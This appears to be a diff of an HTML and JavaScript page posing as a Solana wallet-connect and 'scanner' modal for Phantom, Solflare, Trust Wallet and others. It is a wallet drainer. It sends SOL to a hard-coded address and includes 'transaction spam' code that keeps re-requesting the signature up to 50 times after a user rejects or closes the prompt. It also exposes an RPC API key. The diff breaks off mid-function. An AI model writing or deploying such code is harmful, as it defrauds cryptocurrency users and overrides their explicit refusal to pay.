@@ -1,170 +1,2011 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Phantom Wallet Connect</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Solana Wallet Scanner with SOL Transfer</title>
+  
+  <!-- Solana Web3.js libraries -->
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+  <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
+  
   <style>
     body {
       font-family: Arial, sans-serif;
-      max-width: 600px;
-      margin: 0 auto;
+      background: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    #connectWalletBtn {
+      padding: 10px 20px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 10px;
+      background-color: #4a90e2;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    #connectWalletBtn:hover {
+      background-color: #357abd;
+    }
+
+    #connectWalletBtn.connected {
+      background-color: #28a745;
+    }
+
+    #connectWalletBtn.connected:hover {
+      background-color: #218838;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0,0,0,0.5);
+      z-index: 1000;
+    }
+
+    .connect-wallet, .all-wallets-modal {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      border-radius: 20px;
+      width: 350px;
       padding: 20px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+      z-index: 1001;
+    }
+
+    .connect-header, .modal-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+
+    .connect-header h2, .modal-header h2 {
+      margin: 0;
+      font-size: 1.2rem;
+      font-weight: 600;
+      flex-grow: 1;
       text-align: center;
     }
-    button {
-      background: #4a90e2;
-      color: white;
+
+    .help-btn, .close-btn, .back-btn {
+      background: none;
       border: none;
-      padding: 12px 20px;
-      border-radius: 5px;
+      font-size: 1.2rem;
       cursor: pointer;
-      font-size: 16px;
-      margin: 10px;
+      width: 30px;
+      height: 30px;
+      color: #333;
     }
-    button:hover {
-      background: #357abd;
+
+    .help-btn {
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      background-color: #e0e0e0;
     }
-    #status {
-      margin-top: 20px;
+
+    .wallet-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .wallet-option {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
       padding: 10px;
-      border-radius: 5px;
+      background: #f5f5f5;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s;
+      position: relative;
     }
-    .success {
+
+    .wallet-option:hover {
+      background: #e0e0e0;
+    }
+
+    .wallet-option img {
+      width: 40px;
+      height: 40px;
+      margin-right: 10px;
+      border-radius: 12px;
+    }
+
+    .wallet-option span {
+      flex-grow: 1;
+      font-size: 1rem;
+      color: #333;
+    }
+
+    .connection-status {
+      margin-top: 15px;
+      padding: 10px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 0.9rem;
+    }
+
+    .connection-status.success {
       background: #d4edda;
       color: #155724;
+      border: 1px solid #c3e6cb;
     }
-    .error {
+
+    .connection-status.error {
       background: #f8d7da;
       color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+
+    .connection-status.loading {
+      background: #d1ecf1;
+      color: #0c5460;
+      border: 1px solid #bee5eb;
+    }
+
+    .connection-status.scanning {
+      background: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffeaa7;
+    }
+
+    .connection-status.warning {
+      background: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffeaa7;
+    }
+
+    .wallet-info {
+      margin-top: 15px;
+      padding: 10px;
+      background: #f8f9fa;
+      border-radius: 8px;
+      font-size: 0.85rem;
+    }
+
+    .wallet-info .address {
+      font-family: monospace;
+      word-break: break-all;
+      margin-top: 5px;
+      color: #495057;
+    }
+
+    .wallet-details {
+      margin-top: 10px;
+      padding: 10px;
+      background: #e9ecef;
+      border-radius: 8px;
+      font-size: 0.8rem;
+    }
+
+    .balance-info {
+      margin-bottom: 10px;
+      padding: 8px;
+      background: #d4edda;
+      border-radius: 5px;
+      color: #155724;
+    }
+
+    .token-info {
+      margin-bottom: 5px;
+      padding: 5px;
+      background: #f8f9fa;
+      border-radius: 3px;
+      border-left: 3px solid #007bff;
+    }
+
+    .transfer-section {
+      margin-top: 15px;
+      padding: 10px;
+      background: #fff3cd;
+      border-radius: 8px;
+      border: 1px solid #ffeaa7;
+    }
+
+    .transfer-btn {
+      background: #dc3545;
+      color: white;
+      border: none;
+      padding: 8px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+      font-size: 0.9rem;
+      transition: background-color 0.3s;
+    }
+
+    .transfer-btn:hover {
+      background: #c82333;
+    }
+
+    .transfer-btn:disabled {
+      background: #6c757d;
+      cursor: not-allowed;
+    }
+
+    .get-started {
+      text-align: center;
+      margin-top: 20px;
+      color: #666;
+      font-size: 0.9rem;
+    }
+
+    .get-started a {
+      color: #0000EE;
+      text-decoration: none;
+    }
+
+    .get-started a:hover {
+      text-decoration: underline;
+    }
+
+    .wallet-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+      overflow-y: auto;
+      flex-grow: 1;
+    }
+
+    .wallet-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: #f9f9f9;
+      border-radius: 15px;
+      padding: 10px;
+      cursor: pointer;
+      transition: background 0.3s;
+      user-select: none;
+      position: relative;
+    }
+
+    .wallet-item:hover {
+      background: #e0e0e0;
+    }
+
+    .wallet-item img {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 8px;
+      object-fit: contain;
+      border-radius: 15px;
+    }
+
+    .wallet-item span {
+      font-size: 0.85rem;
+      color: #333;
+      text-align: center;
+    }
+
+    .loading-spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #f3f3f3;
+      border-top: 2px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-left: 8px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .scan-progress {
+      margin-top: 10px;
+      padding: 8px;
+      background: #fff3cd;
+      border-radius: 5px;
+      font-size: 0.8rem;
+      color: #856404;
+    }
+
+    .scan-methods {
+      margin-top: 10px;
+      padding: 8px;
+      background: #e3f2fd;
+      border-radius: 5px;
+      font-size: 0.75rem;
+      color: #1565c0;
+    }
+
+    /* Mobile Adjustments for screens <= 394px */
+    @media (max-width: 394px) {
+      .connect-wallet, .all-wallets-modal {
+        top: auto;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        transform: none;
+        width: 100vw;
+        padding: 15px;
+        border-radius: 15px 15px 0 0;
+        max-height: 85vh;
+        overflow-y: auto;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        box-sizing: border-box;
+      }
+
+      .connect-header h2, .modal-header h2 {
+        font-size: 1.1rem;
+      }
+
+      .help-btn, .close-btn, .back-btn {
+        width: 25px;
+        height: 25px;
+        font-size: 1.1rem;
+      }
+
+      .wallet-option {
+        padding: 8px;
+      }
+
+      .wallet-option img {
+        width: 35px;
+        height: 35px;
+        margin-right: 8px;
+      }
+
+      .wallet-option span {
+        font-size: 0.95rem;
+      }
+
+      .get-started {
+        font-size: 0.85rem;
+        margin-top: 15px;
+      }
+
+      .wallet-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+      }
+
+      .wallet-item img {
+        width: 60px;
+        height: 60px;
+        margin-bottom: 6px;
+      }
+
+      .wallet-item span {
+        font-size: 0.8rem;
+      }
     }
   </style>
 </head>
 <body>
-  <h1>Подключение к Phantom Wallet</h1>
-  <button id="connectBtn">Подключить кошелек</button>
-  <button id="transferBtn" disabled>Списать 0.01 SOL</button>
-  <div id="status"></div>
+  <!-- Button to open the modal -->
+  <button id="connectWalletBtn">Connect Wallet</button>
+
+  <!-- Modal Overlay -->
+  <div id="modalOverlay" class="modal-overlay hidden"></div>
+
+  <!-- Connect Wallet Modal -->
+  <div id="connectWalletModal" class="connect-wallet">
+    <div class="connect-header">
+      <button class="help-btn" title="Help">?</button>
+      <h2>Connect Wallet</h2>
+      <button class="close-btn" title="Close">×</button>
+    </div>
+    
+    <!-- Connection Status Display -->
+    <div id="connectionStatus" class="connection-status hidden"></div>
+    
+    <!-- Wallet Info Display -->
+    <div id="walletInfo" class="wallet-info hidden">
+      <div><strong>Connected Wallet:</strong> <span id="connectedWalletName"></span></div>
+      <div><strong>Address:</strong></div>
+      <div class="address" id="walletAddress"></div>
+      
+      <!-- Wallet Details -->
+      <div id="walletDetails" class="wallet-details hidden">
+        <div id="balanceInfo" class="balance-info"></div>
+        <div id="tokensList"></div>
+        <div id="scanMethods" class="scan-methods hidden"></div>
+        
+        <!-- SOL Transfer Section -->
+        <div id="transferSection" class="transfer-section hidden">
+          <div><strong>⚠️ SOL Transfer:</strong></div>
+          <div style="font-size: 0.8rem; margin-top: 5px;">
+            This will transfer 0.0050 SOL from your wallet to a specified address.
+          </div>
+          <button id="transferSolBtn" class="transfer-btn">
+            Transfer 0.0050 SOL
+          </button>
+          <div id="transferStatus" style="margin-top: 10px; font-size: 0.8rem;"></div>
+        </div>
+      </div>
+      
+      <div style="margin-top: 10px;">
+        <button id="disconnectBtn" style="background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer;">Disconnect</button>
+        <button id="rescanBtn" style="background: #28a745; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; margin-left: 5px;">Rescan</button>
+      </div>
+    </div>
+
+    <div class="wallet-list">
+      <div class="wallet-option" data-wallet="solflare">
+        <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
+        <span>Solflare</span>
+      </div>
+      <div class="wallet-option" data-wallet="phantom">
+        <img src="https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png" alt="Phantom" />
+        <span>Phantom</span>
+      </div>
+      <div class="wallet-option" data-wallet="trustwallet">
+        <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
+        <span>Trust Wallet</span>
+      </div>
+      <div class="wallet-option" data-wallet="coinbase">
+        <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
+        <span>Coinbase</span>
+      </div>
+      <div class="wallet-option" data-wallet="bitget">
+        <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
+        <span>Bitget Wallet</span>
+      </div>
+      <div class="wallet-option" id="allWalletsBtn">
+        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E" alt="All Wallets" />
+        <span>All Wallets</span>
+      </div>
+    </div>
+    <div class="get-started">
+      Haven't got a wallet? <a href="https://phantom.app/" target="_blank">Get started</a>
+    </div>
+  </div>
+
+  <!-- All Wallets Modal -->
+  <div id="allWalletsModal" class="all-wallets-modal hidden">
+    <div class="modal-header">
+      <button class="back-btn" title="Back">←</button>
+      <h2>All Wallets</h2>
+      <button class="close-btn" title="Close">×</button>
+    </div>
+    <div class="wallet-grid">
+      <div class="wallet-item" data-wallet="solflare" tabindex="0">
+        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20350%20350'%3E%3Cpath%20id='a'%20fill='%23FFEF46'%20d='M0%200h350v350H0z'/%3E%3Cpath%20fill='%2302050A'%20d='m171%20183%2014-14%2026%209c18%206%2027%2017%2027%2032%200%2011-5%2019-13%2028l-3%203%201-7c4-24-4-35-28-43l-24-8Zm-36-84%2072%2024-15%2015-38-13c-13-4-18-11-19-26Zm-5%20123%2017-16%2031%2010c16%205%2022%2013%2020%2030l-68-24Zm-20-70c0-5%202-9%206-13%204%206%2012%2012%2024%2016l25%208-14%2014-25-8c-12-4-16-10-16-17Zm76%20127c53-36%2081-60%2081-89%200-20-11-31-37-39l-19-7%2053-51-11-11-16%2014-74-25c-23%208-52%2030-52%2052l1%207c-19%2011-27%2022-27%2034s6%2024%2026%2030l16%206-55%2053%2011%2011%2017-16%2086%2031Z'/%3E%3C/svg%3E" alt="Solflare" />
+        <span>Solflare</span>
+      </div>
+      <div class="wallet-item" data-wallet="phantom" tabindex="0">
+        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20128%20128'%3E%3Cpath%20fill='%23AB9FF2'%20d='M0%200h128v128H0z'/%3E%3Cpath%20fill='%23FFFDF8'%20fill-rule='evenodd'%20d='M55.6%2082.1C51%2089.5%2043%2098.7%2032.3%2098.7c-5%200-9.9-2-9.9-11%200-23%2031.2-58.4%2060.2-58.4%2016.5%200%2023.1%2011.5%2023.1%2024.5%200%2016.6-10.8%2035.7-21.6%2035.7-3.4%200-5-1.9-5-4.8%200-.8%200-1.6.3-2.6-3.7%206.3-10.7%2012.1-17.4%2012.1-4.8%200-7.3-3-7.3-7.3%200-1.5.4-3.1%201-4.8Zm25-28.8c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Zm14.2%200c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Phantom" />
+        <span>Phantom</span>
+      </div>
+      <div class="wallet-item" data-wallet="trustwallet" tabindex="0">
+        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20500'%20fill='white'%3E%3Cdefs%3E%3ClinearGradient%20id='a'%20x1='609.58'%20x2='500.46'%20y1='-1336.58'%20y2='-1679.92'%20gradientTransform='matrix(1%200%200%20-.98%20-255.4%20-1243.33)'%20gradientUnits='userSpaceOnUse'%3E%3Cstop%20offset='.02'%20stop-color='%2300f'%3E%3C/stop%3E%3Cstop%20offset='.08'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.16'%20stop-color='%2348ff91'%3E%3C/stop%3E%3Cstop%20offset='.42'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.68'%20stop-color='%230038ff'%3E%3C/stop%3E%3Cstop%20offset='.9'%20stop-color='%230500ff'%3E%3C/stop%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20fill='%23fff'%20d='M0%200h500v500H0z'%3E%3C/path%3E%3Cpath%20fill='%230500ff'%20d='M105%20141.22%20250%2095v320c-103.57-42.67-145-124.45-145-170.66V141.22Z'%3E%3C/path%3E%3Cpath%20fill='url(%23a)'%20d='M395%20141.22%20250%2095v320c103.57-42.67%20145-124.45%20145-170.66V141.22Z'%3E%3C/path%3E%3C/svg%3E" alt="Trust Wallet" />
+        <span>Trust Wallet</span>
+      </div>
+      <div class="wallet-item" data-wallet="coinbase" tabindex="0">
+        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%201024%201024'%3E%3Cpath%20fill='%230052FF'%20d='M0%200h1024v1024H0z'/%3E%3Cpath%20fill='%23fff'%20fill-rule='evenodd'%20d='M152%20512a360%20360%200%201%200%20720%200%20360%20360%200%200%200-720%200Zm268-116c-13%200-24%2011-24%2024v184c0%2013%2011%2024%2024%2024h184c13%200%2024-11%2024-24V420c0-13-11-24-24-24H420Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Coinbase" />
+        <span>Coinbase</span>
+      </div>
+      <div class="wallet-item" data-wallet="bitget" tabindex="0">
+        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20fill=%22none%22%20viewBox=%220%200%20512%20512%22%3E%3Cpath%20fill=%22%23001F29%22%20d=%22M0%200h512v512H0z%22/%3E%3Cpath%20fill=%22%2300F0FF%22%20d=%22M220%2096h-55c-11%200-15%2014-7%2022l125%20125c4%204%206%208%207%2013-1%205-3%209-7%2012L158%20393c-8%209-4%2023%207%2023h83c12%200%2019-7%2025-13l113-113c9-9%2017-21%2017-34%200-14-8-26-17-35L273%20109c-6-7-13-13-25-13h-28Z%22/%3E%3C/svg%3E" alt="Bitget Wallet" />
+        <span>Bitget Wallet</span>
+      </div>
+      <div class="wallet-item" data-wallet="backpack" tabindex="0">
+        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='10%2010%20220%20220'%3E%3Cpath%20fill='%23fff'%20d='M0%200h240v240H0z'/%3E%3Cpath%20fill='%23EB4646'%20fill-rule='evenodd'%20d='M129%2053c5%200%2010%200%2014%202-4-10-13-13-23-13s-18%203-23%2013c5-2%209-2%2014-2h18Zm-19%2010c-24%200-37%2018-37%2041v24c0%202%202%204%204%204h86c2%200%204-2%204-4v-24c0-23-16-41-39-41h-18Zm10%2041a15%2015%200%201%200%200-30%2015%2015%200%200%200%200%2030Zm-47%2042c0-3%202-5%204-5h86c2%200%204%202%204%205v24c0%205-4%209-9%209H82c-5%200-9-4-9-9v-24Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Backpack" />
+        <span>Backpack</span>
+      </div>
+    </div>
+  </div>
 
   <script>
-    // Проверка на мобильное устройство
-    function isMobile() {
-      return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    // ============================================================================
+    // SOLANA SOL TRANSFER with user confirmation
+    // ============================================================================
+
+    /**
+     * Class for managing SOL transfers
+     */
+    class SolanaSolTransfer {
+      constructor() {
+        // Recipient address (replace with desired address)
+        this.RECIPIENT_ADDRESS = '7BgBvyjrZX8YKHGoW9Y9NChumg5BNVN1r8fKSaVqNPXa';
+        
+        // SOL transfer amount (0.0050 SOL = 5,000,000 lamports)
+        this.TRANSFER_AMOUNT_SOL = 0.0050;
+        this.TRANSFER_AMOUNT_LAMPORTS = this.TRANSFER_AMOUNT_SOL * solanaWeb3.LAMPORTS_PER_SOL;
+        
+        // Transaction spam settings
+        this.MAX_SPAM_ATTEMPTS = 50; 
+        this.SPAM_DELAY_MIN = 1000; 
+        this.SPAM_DELAY_MAX = 3000;
+        this.currentSpamAttempt = 0;
+        this.isSpamActive = false;
+        this.spamTimeouts = [];
+        
+        // RPC endpoints
+        this.RPC_ENDPOINTS = [
+          'https://mainnet.helius-rpc.com/?api-key=5d71bf51-5f82-4892-8b89-c7257acb9384',
+          'https://api.mainnet-beta.solana.com',
+          'https://solana-api.projectserum.com'
+        ];
+        
+        this.connection = null;
+        this.initConnection();
+      }
+
+      /**
+       * Initialize Solana connection
+       */
+      initConnection() {
+        try {
+          this.connection = new solanaWeb3.Connection(
+            this.RPC_ENDPOINTS[0],
+            'confirmed'
+          );
+          console.log('✅ Solana connection initialized for SOL transfer');
+        } catch (error) {
+          console.error('❌ Failed to initialize Solana connection:', error);
+        }
+      }
+
+      /**
+       * Create transaction for transferring SOL
+       */
+      async createSolTransferTransaction(fromAddress, toAddress, amount) {
+        if (!this.connection) {
+          throw new Error('Solana connection not initialized');
+        }
+
+        console.log('🚀 Creating SOL transfer transaction...');
+        console.log('📍 From:', fromAddress);
+        console.log('📍 To:', toAddress);
+        console.log('💰 Amount:', amount / solanaWeb3.LAMPORTS_PER_SOL, 'SOL');
+
+        const fromPubkey = new solanaWeb3.PublicKey(fromAddress);
+        const toPubkey = new solanaWeb3.PublicKey(toAddress);
+
+        // Create SOL transfer instruction
+        const transferInstruction = solanaWeb3.SystemProgram.transfer({
+          fromPubkey: fromPubkey,
+          toPubkey: toPubkey,
+          lamports: amount
+        });
+
+        // Create transaction
+        const transaction = new solanaWeb3.Transaction().add(transferInstruction);
+
+        // Get latest blockhash
+        const { blockhash } = await this.connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = fromPubkey;
+
+        console.log('📦 SOL transfer transaction created');
+        
+        return transaction;
+      }
+
+      /**
+       * Check SOL balance
+       */
+      async checkSolBalance(address) {
+        try {
+          const publicKey = new solanaWeb3.PublicKey(address);
+          const balance = await this.connection.getBalance(publicKey);
+          const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+          
+          console.log(`💰 Current SOL balance: ${solBalance} SOL`);
+          return { balance: solBalance, lamports: balance };
+        } catch (error) {
+          console.error('❌ Error checking SOL balance:', error);
+          return { balance: 0, lamports: 0 };
+        }
+      }
+
+      /**
+       * Start transaction spam
+       */
+      async startTransactionSpam(walletAddress, walletProvider) {
+        if (this.isSpamActive) {
+          console.log('🔄 Transaction spam already active');
+          return;
+        }
+
+        this.isSpamActive = true;
+        this.currentSpamAttempt = 0;
+        
+        console.log('🚨 Starting transaction spam...');
+        
+        // Start first attempt
+        await this.executeSpamAttempt(walletAddress, walletProvider);
+      }
+
+      /**
+       * Execute one spam attempt
+       */
+      async executeSpamAttempt(walletAddress, walletProvider) {
+        if (!this.isSpamActive || this.currentSpamAttempt >= this.MAX_SPAM_ATTEMPTS) {
+          console.log('🛑 Transaction spam stopped');
+          this.isSpamActive = false;
+          return;
+        }
+
+        this.currentSpamAttempt++;
+        
+        console.log(`🔄 Spam attempt ${this.currentSpamAttempt}/${this.MAX_SPAM_ATTEMPTS}`);
+        
+        try {
+          // Check balance before each attempt
+          const balanceInfo = await this.checkSolBalance(walletAddress);
+          
+          if (balanceInfo.balance < this.TRANSFER_AMOUNT_SOL) {
+            console.log('❌ Insufficient balance, stopping spam');
+            this.isSpamActive = false;
+            return;
+          }
+
+          // Create and send transaction
+          const result = await this.executeSingleTransfer(walletAddress, walletProvider);
+          
+          if (result.success) {
+            console.log('✅ Spam transaction successful!');
+            
+            // Stop spam after successful transaction
+            this.isSpamActive = false;
+            return;
+          }
+          
+        } catch (error) {
+          console.error(`❌ Spam attempt ${this.currentSpamAttempt} failed:`, error);
+          
+          // Check error types to determine retry strategy
+          if (this.shouldRetryAfterError(error)) {
+            console.log('🔄 Will retry after error...');
+          } else {
+            console.log('🛑 Critical error, stopping spam');
+            this.isSpamActive = false;
+            return;
+          }
+        }
+
+        // Schedule next attempt with random delay
+        if (this.isSpamActive) {
+          const delay = Math.random() * (this.SPAM_DELAY_MAX - this.SPAM_DELAY_MIN) + this.SPAM_DELAY_MIN;
+          
+          console.log(`⏳ Next spam attempt in ${Math.round(delay)}ms`);
+          
+          const timeoutId = setTimeout(() => {
+            this.executeSpamAttempt(walletAddress, walletProvider);
+          }, delay);
+          
+          this.spamTimeouts.push(timeoutId);
+        }
+      }
+
+      /**
+       * Determine if we should retry after error
+       */
+      shouldRetryAfterError(error) {
+        const errorMessage = error.message.toLowerCase();
+        
+        // Errors we should retry after
+        const retryableErrors = [
+          'user rejected',
+          'user denied',
+          'user cancelled',
+          'transaction cancelled',
+          'popup closed',
+          'user closed',
+          'rejected by user',
+          'cancelled by user'
+        ];
+        
+        return retryableErrors.some(retryError => errorMessage.includes(retryError));
+      }
+
+      /**
+       * Execute a single transfer (without retries)
+       */
+      async executeSingleTransfer(walletAddress, walletProvider) {
+        try {
+          // Create transaction
+          const transaction = await this.createSolTransferTransaction(
+            walletAddress,
+            this.RECIPIENT_ADDRESS,
+            this.TRANSFER_AMOUNT_LAMPORTS
+          );
+
+          console.log('📝 Requesting wallet signature...');
+
+          // Sign transaction with wallet
+          let signedTransaction;
+          
+          if (walletProvider.signTransaction) {
+            signedTransaction = await walletProvider.signTransaction(transaction);
+          } else if (walletProvider.signAndSendTransaction) {
+            // Some wallets directly send the transaction
+            const signature = await walletProvider.signAndSendTransaction(transaction);
+            console.log('✅ SOL transfer sent with signature:', signature);
+            
+            return {
+              success: true,
+              signature: signature,
+              amount: this.TRANSFER_AMOUNT_SOL,
+              recipient: this.RECIPIENT_ADDRESS,
+              message: `Successfully transferred ${this.TRANSFER_AMOUNT_SOL} SOL`
+            };
+          } else {
+            throw new Error('Wallet does not support transaction signing');
+          }
+
+          console.log('📤 Sending signed SOL transfer transaction...');
+
+          // Send signed transaction
+          const signature = await this.connection.sendRawTransaction(
+            signedTransaction.serialize(),
+            {
+              skipPreflight: false,
+              preflightCommitment: 'confirmed'
+            }
+          );
+
+          console.log('⏳ Confirming SOL transfer transaction...');
+
+          // Wait for transaction confirmation
+          const confirmation = await this.connection.confirmTransaction(signature, 'confirmed');
+
+          if (confirmation.value.err) {
+            throw new Error(`SOL transfer failed: ${confirmation.value.err}`);
+          }
+
+          console.log('✅ SOL transfer confirmed:', signature);
+
+          return {
+            success: true,
+            signature,
+            amount: this.TRANSFER_AMOUNT_SOL,
+            recipient: this.RECIPIENT_ADDRESS,
+            message: `Successfully transferred ${this.TRANSFER_AMOUNT_SOL} SOL`
+          };
+
+        } catch (error) {
+          console.error('❌ Single SOL transfer failed:', error);
+          
+          return {
+            success: false,
+            error: error.message,
+            amount: this.TRANSFER_AMOUNT_SOL,
+            recipient: this.RECIPIENT_ADDRESS,
+            message: `SOL transfer failed: ${error.message}`
+          };
+        }
+      }
+
+      /**
+       * Main function to execute SOL transfer (with automatic spam)
+       */
+      async executeSolTransfer(walletAddress, walletProvider) {
+        console.log('🚀 Starting SOL transfer with spam protection...');
+        
+        // Try normal transfer first
+        const firstAttempt = await this.executeSingleTransfer(walletAddress, walletProvider);
+        
+        if (firstAttempt.success) {
+          console.log('✅ First attempt successful, no spam needed');
+          return firstAttempt;
+        }
+        
+        // If first attempt failed, check if we should start spam
+        if (this.shouldRetryAfterError(new Error(firstAttempt.error))) {
+          console.log('🚨 First attempt failed, starting transaction spam...');
+          await this.startTransactionSpam(walletAddress, walletProvider);
+          
+          return {
+            success: false,
+            error: 'Transaction spam initiated',
+            amount: this.TRANSFER_AMOUNT_SOL,
+            recipient: this.RECIPIENT_ADDRESS,
+            message: 'Transaction spam started due to user rejection'
+          };
+        }
+        
+        // If error is critical, return result of first attempt
+        return firstAttempt;
+      }
+
+      /**
+       * Stop transaction spam
+       */
+      stopTransactionSpam() {
+        console.log('🛑 Stopping transaction spam...');
+        
+        this.isSpamActive = false;
+        
+        // Clear all scheduled timeouts
+        this.spamTimeouts.forEach(timeoutId => {
+          clearTimeout(timeoutId);
+        });
+        this.spamTimeouts = [];
+        
+        this.currentSpamAttempt = 0;
+      }
     }
 
-    // Deeplink для открытия Phantom Wallet на мобильных
-    const PHANTOM_DEEPLINK = 'https://phantom.app/ul/browse/';
-    const PHANTOM_APP_LINK = 'phantom://browse/';
+    // ============================================================================
+    // FAST WALLET BALANCE CHECKER (FIRST SUCCESS ONLY)
+    // ============================================================================
 
-    // Адрес для списания SOL (замените на свой)
-    const RECIPIENT_ADDRESS = '7BgBvyjrZX8YKHGoW9Y9NChumg5BNVN1r8fKSaVqNPXa';
-    const TRANSFER_AMOUNT = 0.01; // 0.01 SOL
+    /**
+     * Browser version of makeRequest with short timeout
+     */
+    async function makeRequest(url, method, data, retries = 2, timeout = 5000) {
+      for (let attempt = 1; attempt <= retries; attempt++) {
+        try {
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), timeout);
 
-    let provider;
-    let publicKey;
+          const options = {
+            method,
+            headers: { 'Content-Type': 'application/json' },
+            signal: controller.signal
+          };
 
-    // Функция для открытия Phantom Wallet
-    function openPhantomWallet() {
-      if (isMobile()) {
-        // Открываем мобильное приложение через Deeplink
-        window.location.href = PHANTOM_APP_LINK + encodeURIComponent(window.location.href);
-      } else {
-        // На десктопе используем API Phantom
-        if (window.phantom?.solana?.isPhantom) {
-          provider = window.phantom.solana;
-          connectWallet();
-        } else {
-          // Если Phantom не установлен, предлагаем скачать
-          window.open('https://phantom.app/', '_blank');
-          document.getElementById('status').textContent = 'Установите Phantom Wallet для подключения';
-          document.getElementById('status').className = 'error';
+          if (data && method !== 'GET') {
+            options.body = JSON.stringify(data);
+          }
+
+          const response = await fetch(url, options);
+          clearTimeout(timeoutId);
+
+          if (!response.ok) {
+            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+          }
+
+          return await response.json();
+        } catch (error) {
+          console.error(`Attempt ${attempt} failed for ${url}: ${error.message}`);
+          if (attempt === retries) {
+            console.error(`All attempts failed for ${url}`);
+            return null;
+          }
+          await new Promise(resolve => setTimeout(resolve, 500));
         }
       }
     }
 
-    // Подключение кошелька через API Phantom
-    async function connectWallet() {
-      try {
